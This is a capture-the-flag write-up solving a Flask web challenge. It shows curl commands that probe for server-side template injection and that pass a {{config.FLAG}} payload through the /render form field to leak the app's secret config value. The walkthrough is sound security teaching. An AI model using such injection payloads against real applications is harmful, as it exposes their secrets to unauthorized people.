# Portfolio
Web, 150 points

## Description

> Check out my development portfolio! I'm just getting started, so don't be too mean :(


## Solution

We visit the attached site and see:

```html
  <body>
    <header>
      <h1 align="center">Welcome to my dev portfolio!</h1>
      <h3 align="center">check out my cool projects</h3>
    </header>
    <br>
    <h2> Projects </h2>
    <ul> 
      <li><a href="/hello/name">Custom greeting</a></li>
      <li><a href="/render.html">Dynamic page rendering</a></li>
    </ul>
  </body>
```

The first link leads to a very simple page:
```console
root@kali:~# curl "http://archive.sunshinectf.org:19009/hello/name" && echo
<html>
  <head>
    <title>Templating in Flask</title>
  </head>
  <body>
    <h1>Hello name!</h1>
    <p>Welcome to the world of Flask!</p>
  </body>
</html>
```

Such challenges usually lead to [template injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection), so let's try that here:
```console
root@kali:~# curl "http://archive.sunshinectf.org:19009/hello/\{\{4*4\}\}" && echo
<html>
  <head>
    <title>Templating in Flask</title>
  </head>
  <body>
    <h1>Hello {{4*4}}!</h1>
    <p>Welcome to the world of Flask!</p>
  </body>
</html>
```

The template was not evaluated, so this page isn't vulnerable to such an attack. 

Moving on, we have we have the "Dynamic page rendering" page:
```console
root@kali:~# curl "http://archive.sunshinectf.org:19009/render.html"  && echo
<form action="/render" method="post">
  Page to load:<br>
  <select name="template">
    <option value="templates/matches.html">My favorite matches</option>
    <option value="templates/teams.html">Some cool tag teams</option>
    <!--    <option value="templates/admin.html">admin</option>-->
  </select>
  <input type="submit" value="Submit">
</form>
```

Let's try to visit all three options (including the commented out admin page):
```console
root@kali:~# curl "http://archive.sunshinectf.org:19009/render" -X POST  --data "template=templates/matches.html" && echo
Some cool matches
root@kali:~# curl "http://archive.sunshinectf.org:19009/render" -X POST  --data "template=templates/teams.html" && echo
some cool teams
root@kali:~# curl "http://archive.sunshinectf.org:19009/render" -X POST  --data "template=templates/admin.html" && echo

Hi there!
```

Nothing much. However, if we inspect "admin.html" directly, we get an interesting result:
```console
root@kali:~# curl "http://archive.sunshinectf.org:19009/templates/admin.html" && echo
{% if config.DEBUG %}
{{config.FLAG}}
{% endif %}
Hi there!
```

In debug mode, the flag would have been outputted. Can we trigger debug mode? Not in an apparent way. However, we can use the "hello" page we saw earlier in order to create a template that would reveal the flag:

```console
root@kali:~# curl "http://archive.sunshinectf.org:19009/hello/\{\{config.FLAG\}\}" && echo
<html>
  <head>
    <title>Templating in Flask</title>
  </head>
  <body>
    <h1>Hello {{config.FLAG}}!</h1>
    <p>Welcome to the world of Flask!</p>
  </body>
</html>
root@kali:~# curl "http://archive.sunshinectf.org:19009/render" -X POST  --data "template=hello/{{config.FLAG}}" && echo
<html>
  <head>
    <title>Templating in Flask</title>
  </head>
  <body>
    <h1>Hello sun{5l33333p_15_f0r_7h3_w34k}!</h1>
    <p>Welcome to the world of Flask!</p>
  </body>
</html>
```